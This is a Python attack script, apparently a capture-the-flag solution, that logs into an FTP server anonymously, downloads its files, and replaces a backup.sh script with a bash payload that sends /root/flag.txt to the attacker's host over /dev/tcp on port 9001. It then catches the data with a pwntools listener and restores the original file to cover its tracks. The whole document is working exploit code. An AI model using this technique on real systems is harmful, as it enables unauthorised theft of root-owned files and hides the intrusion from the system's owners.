#!/usr/bin/env python3
from ftplib import FTP
from pwn import *
from binascii import hexlify

context.log_level = 'error'

host = '10.10.66.142'
LHOST = [redacted]

output = ""

def get(inp):
    global output
    output += inp + '\n'

def cleandir(listing):
    return [l.split(' ')[-1] for l in listing.split('\n') if len(l) > 0 ]


ftp = FTP(host)
ftp.login()
ftp.dir(get)

directories = cleandir(output)

print(directories)

for directory in directories:
    output = ""
    ftp.dir(directory, get)
    if len(output) > 0:
        subdir = cleandir(output)
        print(f'Directory {directory} contains {subdir}')
        break
        
for fname in subdir:
    output = ""
    print(f'Downloding {directory}/{fname}\n=================')
    ftp.retrlines(f'RETR {directory}/{fname}',get)
    print(output)
    with open(fname,'w') as f:
        f.write(output)

exploit = "#!/bin/bash\n"
exploit += f"cat /root/flag.txt > /dev/tcp/{LHOST}/9001"

target = 'backup.sh'

with open('exploit.sh','w') as f:
    f.write(exploit)

with open('exploit.sh','rb') as f:
    ftp.storbinary(f"STOR {directory}/{target}",f)

#confirm upload
output = ""
ftp.retrlines(f'RETR {directory}/{target}',get)

# catch flag
l = listen(port=9001, bindaddr=LHOST)
flag = l.readline()
l.close()

print(flag.decode())

# covertracks
target = "backup.sh"
with open('backup.sh','rb') as f:
    ftp.storbinary(f"STOR {directory}/{target}",f)

ftp.close()